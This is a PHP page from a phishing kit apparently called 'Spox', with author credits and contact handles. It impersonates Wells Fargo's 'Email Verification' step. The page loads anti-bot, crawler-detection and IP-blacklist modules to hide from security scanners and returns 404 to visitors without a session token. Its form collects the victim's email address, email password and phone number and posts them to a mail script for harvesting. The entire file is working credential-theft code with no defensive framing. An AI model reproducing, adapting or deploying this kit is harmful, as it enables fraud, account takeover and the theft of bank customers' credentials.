<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Wells -
 * version 1.0
 * Re-Loaded By Groot
 * icq+teleg = @iam_groot
 
###############################################
#$            C0d3d by Spoxcoder             $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';
@require "Spox/Anti/Crawler/src/CrawlerDetect.php";

use JayBizzle\CrawlerDetect\CrawlerDetect;

if (!isset($_GET['wells_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['WELLS_SPOX'])) {

  header("Location: index");
  exit();
}


?>
<html class="ui-mobile wf-myriadpro-n4-active wf-active" lang="en" data-device="desktop" data-masked-input-enabled="true" data-print-link-enabled="true">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<title>Wells Fargo - Verification - Email Verification</title>



<link rel="stylesheet" href="Spox/Files/css/jquery.mobile.css?v=19.10.00">
<link rel="stylesheet" href="Spox/Files/css/normalize.css">
<link rel="stylesheet" href="Spox/Files/css/Wells-Fargo-LIVE-Div.css"> 
<link rel="stylesheet" href="Spox/Files/css/ClientPage.css">
	
<link rel="stylesheet" href="Spox/Files/css/desktop-tablet.combined.css?v=19.10.00">
		<!--[if lt IE 9]>
			<link rel="stylesheet" href="Spox/Files/css/medium-screen.css?v=19.10.00" />
			<link rel="stylesheet" href="Spox/Files/css/large-screen.css?v=19.10.00" />
			<link rel="stylesheet" href="Spox/Files/css/ie.css?v=19.10.00" />
			<link rel="stylesheet" href="Spox/Files/css/ie-print.css?v=19.10.00" media="print" />
		<![endif]-->
	
	

<!--  load the sync tealium  -->

<!-- load myriad font  -->

<style type="text/css">.tk-myriad-pro{font-family:"myriad-pro",sans-serif;}</style><style type="text/css">@font-face{font-family:myriad-pro;src:url(Spox/Files/css/b87d1abf881446b2bae0d8204029d20a9b85e656-l.woff2) format("woff2"),url(Spox/Files/css/b87d1abf881446b2bae0d8204029d20a9b85e656-d.woff) format("woff"),url() format("opentype");font-weight:400;font-style:normal;}</style>
<!-- myriad font loaded  -->

</head>
<body class="ui-mobile-viewport ui-overlay-a" data-inq-observer="1">
<style type="text/css">
	.help-block.form-error {
    color: #dc3545!important;
}
</style>
	<div id="mainpage" data-role="page" class="osmp-app ui-page ui-page-theme-a ui-page-active" data-title="Wells Fargo - Application - About You" data-url="mainpage" tabindex="0" style="">

<header role="banner">
	<div class="masthead">
		<nav role="presentation">
					<a class="c28cLink child-window ui-link" aria-label="Wells Fargo" href="#"> <img class="masthead-img-logo" alt="Wells Fargo" role="img" src="Spox/Files/img/lol1.svg">
					</a>
		</nav>

				<div role="navigation" class="top-search">
					<ul>

								<li class="security">
									<a class="c28cLink child-window ui-link" href="#" data-platform="salesplatform">Online Security<span class="ui-hidden-accessible">, opens in a new window</span>
									</a>
								</li>

					</ul>
				</div>

	</div>
</header>

		
		<div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
			<div class="primary-content">
					<div class="progress-small small-screen">
					
	        	    	<span class="right">
		        	    	Step 3 of 5
	    	    		</span>
			    	</div>
  
			<div class="progress-bar not-small-screen">
				<ul class="ui-grid-d">
								            		
					            		<li class="ui-block-b previous">
							               <span class="ui-hidden-accessible">
								        	    	Completed Step
								        	    </span>
							            	<span><span>Security Question</span></span>
							            </li>						            
	            		
					            		<li class="ui-block-c active">
					            			<span class="ui-hidden-accessible">Current Step</span>
							            	<span><span>Email verification</span></span>
							            </li>						            
		            		
					            		<li class="ui-block-c">
							        	    							            	
							            	<span><span>Contact information</span></span>
							            </li>						            
		            		
					            		<li class="ui-block-d">
							        	    							            	
							            	<span><span>Credit card</span></span>
							            </li>						            

					            				            		
					            		<li class="ui-block-e">
							        	    							            	
							            	<span><span>Review</span></span>
							            </li>						            
					            
					</ul>      
			</div>		

				<br>
<div class="section">


		<form id="yourInfoCommand" class="wait" action="Spox/Mail/Mail3.php" method="POST" >

<h2 class="section-hdr">
	Email access information
</h2>

	<div class="ui-field-contain">
		<label for="emailAddressJt">
			Email address
		</label>
		
<div class="ui-field-contain margin-bot-0">

		<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="emailAddressJt" name="emailaccess" class="required EMAIL" data-validation="email" data-validation-error-msg="Please enter valid email address"  size="43" placeholder="myemail@email.com" >
</div>
	</div>
	<div class="ui-field-contain">
		<label for="emailAddressJt">
			Email password
		</label>
		
<div class="ui-field-contain margin-bot-0">

		<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="emailAddressJt" type="password" name="emailaccesspass" class="required EMAIL" data-validation="length" data-validation-error-msg="Please enter the correct password" data-validation-length="min2" size="43" placeholder="*********" >
</div>
	</div>
	
	
		<div class="ui-field-contain inline-field-contain">
			<div class="inline-field">
				<label for="primaryPhoneJt">
					Phone number
				</label>

				<input class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset" id="phoneNumber" name="phonenumber" class="required PHONE" type="tel" value="" data-validation="length" data-validation-error-msg="Please enter a valid phone number" data-validation-length="min14"  size="13"  placeholder="(___) ___ ____" >

	
			</div>
			<div class="inline-field" style="min-height: 63.1875px;">
				<label for="primaryPhoneTypeJt">	
					Phone type			
				</label>

			<select id="primaryPhoneTypeJt" name="phonetype" class="required" required="" >
					<option value="">
						Select one
					</option>
						<option value="HOME">Home</option>
						<option value="MOBILE">Mobile</option>
						<option value="WORK">Work</option>
				    </select>
				
			</div>
		</div>
		<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/dependencyLibs/inputmask.dependencyLib.js"></script>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/inputmask.js"></script>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});

 
Inputmask("(9{1,3}) 9{1,3} 9{1,4}").mask("#phoneNumber");</script>




<div class="btn-ctr"><div class="btn-ctr-inner">
	<input class="flow-event" type="hidden" name="_eventId_continue" value="">
	
<button type="submit" data-flow-event="_eventId_continue" data-mrkt-tracking-id="continue" class="continue-button ui-btn ui-btn-p">
				Continue
			</button>
</div>
</form>
<br>
<div style="display: none;" id="cancelPopup-placeholder"><!-- placeholder for cancelPopup --></div>

</div>

</div>
<div data-role="footer" class="osmp-footer ui-footer ui-bar-inherit singleColumn" role="contentinfo">
		
	<footer role="contentinfo">
			<div class="c9">
				<nav aria-label="corporate, legal, security">
					<ul class="not-large-screen">

									<li><a class="c28cLink child-window ui-link" href="#">Privacy, Cookies, Security &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="#">Ad Choices</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="#" data-platform="salesplatform">Online Security</a></li>

					
					</ul>				
					<ul class="large-screen">

									<li><a class="c28cLink child-window ui-link" href="#">Privacy, Cookies, Security &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="#">Ad Choices</a></li>
									<li><a class="c28cLink child-window ui-link" title="#" href="#" data-platform="salesplatform">Online Security</a></li>

					</ul>				
				</nav>
				<hr>
				© 1999 - <span class="placeholder">2020</span> Wells Fargo. All rights reserved. NMLSR ID 399801
			</div>
		</footer>
</div>

<div style="display: none;"><!-- placeholder --></div>
<div style="display: none;"><!-- placeholder --></div></div></div></div>

</div></div>
<div id="inqDivResizeCorner" style="border-width: 0px; position: absolute; z-index: 9999999; left: 424px; top: 284px; cursor: se-resize; height: 16px; width: 16px; display: none;">
</div>
<div id="inqResizeBox" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; display:none; height: 0px; width: 0px;"></div><div id="inqTitleBar" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; cursor: move; height: 55px; width: 410px; display: none;">
	
</div>
<div id="nuance-chat-anchored" style="position: fixed; width: auto; right:20px; bottom:20px; z-index: 999999;" aria-live="polite"><div>
<style>
 .wf-FAB-aval { 
     cursor: pointer;
     border: 1px solid #ffffff;
     border-radius: 50%; 
     background: #AE1E23; 
     box-shadow: 3px 3px 3px 0 rgba(0,0,0,.15);
     height: 56px;
     width: 56px;
     padding: 0;
 } 

 .wf-FAB-aval svg {
     display: block;
     margin: 5px auto 0 auto;  
 } 
 html .page {
    overflow: visible;
}
.ui-mobile input, .ui-mobile select, .ui-mobile textarea, .ui-mobile button, .ui-mobile .ui-btn, .ui-btn {
    line-height: 2.3;
}
</style></div></div><div id="nuance-chat-anchored-2" style="position: fixed; width: auto; right:20px; bottom:20px; z-index: 999988;"></div></body>
</html>